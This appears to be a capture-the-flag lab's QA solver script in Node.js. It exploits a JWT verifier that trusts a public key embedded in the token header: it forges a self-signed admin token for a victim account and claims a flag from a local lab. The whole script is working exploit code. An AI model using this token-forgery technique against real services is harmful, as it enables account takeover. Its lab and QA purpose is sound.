#!/usr/bin/env node
/*
 * VLH-CTF QA solver — DSLTV JWT/jwk-injection (JwkInjection).
 *
 * Intended path: log in as a tester → discover the innocent account via
 * GET /api/directory → generate our own RSA keypair → embed the public JWK
 * {kty:'RSA', n, e} directly in the token header → RS256-sign with our
 * private key. The verifier (vuln.js) honors an embedded header.jwk and
 * verifies against the key INSIDE the token instead of the platform key set
 * ("self-describing tokens" key-control flaw). Claim the flag at GET /flag/jwt.
 *
 * Env: LAB (default http://localhost:8119). Vhosts via the Host header.
 * Node 20+ built-ins only. Exit 0 only on a /DSLTV\{JWT-JwkInjection-\d+\}/ flag.
 */
import http from 'node:http';
import crypto from 'node:crypto';

const LAB = process.env.LAB || process.env.LAB_URL || 'http://localhost:8119';
const BASE = new URL(LAB);
const HOSTNAME = BASE.hostname;
const PORT = Number(BASE.port || 80);
const VICTIM = `victim.target.lab:${PORT}`;
const FLAG_RE = /^DSLTV\{JWT-JwkInjection-\d+\}$/;
const PROFILE = 'dsltv-jwt-jwk-injection';

const step = (m) => console.log(`[*] ${m}`);
const ok = (m) => console.log(`[+] ${m}`);
const fail = (m) => { console.error(`[-] ${m}`); process.exit(1); };

function request(method, path, { vhost = VICTIM, body, headers = {} } = {}) {
  return new Promise((resolve, reject) => {
    const payload = body === undefined ? null : (typeof body === 'string' ? body : JSON.stringify(body));
    const h = { host: vhost, ...headers };
    if (payload !== null && !h['content-type']) h['content-type'] = 'application/json';
    const req = http.request({ hostname: HOSTNAME, port: PORT, path, method, headers: h }, (res) => {
      const chunks = [];
      res.on('data', (c) => chunks.push(c));
      res.on('end', () => resolve({ status: res.statusCode, text: Buffer.concat(chunks).toString('utf8') }));
    });
    req.setTimeout(5000, () => req.destroy(new Error(`request timeout: ${method} ${path}`)));
    req.on('error', reject);
    if (payload !== null) req.write(payload);
    req.end();
  });
}

const asJson = (r) => { try { return JSON.parse(r.text); } catch (_) { return null; } };
const b64u = (obj) => Buffer.from(JSON.stringify(obj)).toString('base64url');

async function main() {
  step(`target ${LAB} (Host: ${VICTIM}) — profile ${PROFILE}`);

  /* 1. log in as the known tester — legit tokens use the platform key (kid echoed) */
  const lr = await request('POST', '/login', { body: { username: '0xnhsec', password: 'vlh-tester-01' } });
  const lj = asJson(lr);
  if (lr.status !== 200 || !lj || !lj.token) fail(`tester login failed: HTTP ${lr.status} ${lr.text.slice(0, 200)}`);
  ok(`logged in as 0xnhsec (server token kid=${lj.kid}, signed by the platform key)`);

  /* 2. discover the innocent identity via the legit leak endpoint */
  const dr = await request('GET', '/api/directory');
  const dj = asJson(dr);
  const innocent = dj && dj.users ? dj.users.find((u) => u.role === 'innocent') : null;
  if (!innocent) fail(`innocent not found in /api/directory: HTTP ${dr.status} ${dr.text.slice(0, 200)}`);
  ok(`innocent identity discovered: ${innocent.username}`);

  /* 3. our own keypair — the public JWK travels inside the token header */
  const { publicKey, privateKey } = crypto.generateKeyPairSync('rsa', { modulusLength: 2048 });
  const jwk = publicKey.export({ format: 'jwk' });
  const header = { alg: 'RS256', typ: 'JWT', kid: 'atk', jwk: { kty: jwk.kty, n: jwk.n, e: jwk.e } };
  const payload = { sub: innocent.username, role: 'admin', iat: Math.floor(Date.now() / 1000) };
  const h = b64u(header), p = b64u(payload);
  const sig = crypto.createSign('RSA-SHA256').update(`${h}.${p}`).sign(privateKey, 'base64url');
  const forged = `${h}.${p}.${sig}`;
  ok('forged RS256 token with the attacker JWK embedded in the header (self-signed)');

  /* 4. claim the flag */
  const fr = await request('GET', '/flag/jwt', { headers: { authorization: `Bearer ${forged}` } });
  const fj = asJson(fr);
  if (fr.status === 200 && fj && fj.flag && FLAG_RE.test(fj.flag)) {
    ok(`FLAG ${fj.flag}`);
    process.exit(0);
  }
  fail(`/flag/jwt rejected the forged token: HTTP ${fr.status} ${fr.text.slice(0, 300)}`);
}

main().catch((e) => {
  if (e && (e.code === 'ECONNREFUSED' || e.code === 'ENOTFOUND' || e.code === 'EHOSTUNREACH')) {
    fail(`lab not running (${e.code} on ${LAB}) — start it: docker compose --profile ${PROFILE} up -d`);
  }
  fail(e && e.stack ? e.stack : String(e));
});
